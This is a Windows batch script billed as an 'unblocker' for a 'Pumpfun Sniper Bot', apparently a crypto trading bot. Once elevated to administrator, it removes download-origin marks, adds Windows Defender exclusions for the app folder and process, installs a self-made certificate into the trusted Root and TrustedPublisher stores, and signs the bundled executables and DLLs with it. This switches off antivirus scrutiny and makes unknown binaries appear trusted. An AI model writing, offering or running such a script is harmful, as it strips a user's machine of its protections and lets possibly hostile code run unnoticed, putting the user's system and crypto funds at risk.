@echo off
setlocal enabledelayedexpansion

echo =======================================================
echo   Pumpfun Sniper Bot - Windows Application Unblocker
echo =======================================================
echo.

:: Check for administrative privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting Administrator privileges to unblock application and register trusted certificate...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo [1/4] Unblocking Mark of the Web on all project and binary files...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Get-ChildItem -Path '%~dp0release-app' -Recurse -ErrorAction SilentlyContinue | Unblock-File; " ^
    "Get-ChildItem -Path '%~dp0desktop-build' -Recurse -ErrorAction SilentlyContinue | Unblock-File; " ^
    "Get-ChildItem -Path '%~dp0dist-exe' -Recurse -ErrorAction SilentlyContinue | Unblock-File; "

echo [2/4] Adding Windows Defender exclusions for application folder and process...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue; " ^
    "Add-MpPreference -ExclusionPath '%~dp0release-app\win-unpacked' -ErrorAction SilentlyContinue; " ^
    "Add-MpPreference -ExclusionProcess 'Pumpfun Sniper Bot.exe' -ErrorAction SilentlyContinue; "

echo [3/4] Registering Trusted Code Signing Certificate...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$cert = Get-ChildItem -Path Cert:\CurrentUser\My | Where-Object { $_.Subject -match 'Pumpfun Sniper Bot' } | Select-Object -First 1; " ^
    "if (-not $cert) { " ^
    "    $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject 'CN=Pumpfun Sniper Bot, O=Local Development' -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(10) -FriendlyName 'Pumpfun Sniper Bot Signer'; " ^
    "} " ^
    "$bytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert); " ^
    "[System.IO.File]::WriteAllBytes('%~dp0pumpfun_cert.cer', $bytes); " ^
    "certutil -addstore -f Root '%~dp0pumpfun_cert.cer' | Out-Null; " ^
    "certutil -addstore -f TrustedPublisher '%~dp0pumpfun_cert.cer' | Out-Null; " ^
    "$targets = @('%~dp0release-app\win-unpacked', '%~dp0desktop-build\win-unpacked', '%~dp0dist-exe'); " ^
    "foreach ($target in $targets) { " ^
    "    if (Test-Path $target) { " ^
    "        Get-ChildItem -Path $target -Include '*.exe','*.dll' -Recurse | ForEach-Object { " ^
    "            Set-AuthenticodeSignature -FilePath $_.FullName -Certificate $cert -HashAlgorithm SHA256 | Out-Null " ^
    "        } " ^
    "    } " ^
    "} "

echo [4/4] Done! The application is now fully unblocked, excluded from Defender blocking, and digitally trusted.
echo.
echo =======================================================
echo You can now run "Pumpfun Sniper Bot.exe" directly or use Launch_App.bat!
echo =======================================================
echo.
pause
